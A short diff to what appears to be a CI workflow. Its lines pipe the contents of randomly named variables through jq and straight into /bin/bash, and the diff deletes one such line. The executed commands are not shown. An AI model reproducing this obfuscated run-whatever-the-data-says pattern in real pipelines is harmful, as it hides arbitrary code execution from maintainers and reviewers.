@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$ucmuz64" | jq -r .beyn736 | /bin/bash
           echo $t89 | jq -r .q361 | /bin/bash
           echo $npwk287 | jq -r .s9419 | /bin/bash
-          echo $wa940 | jq -r .uod9 | /bin/bash
           echo $amd8 | jq -r .xpe3633 | /bin/bash
           echo $zi52 | jq -r .wxcj8 | /bin/bash
 
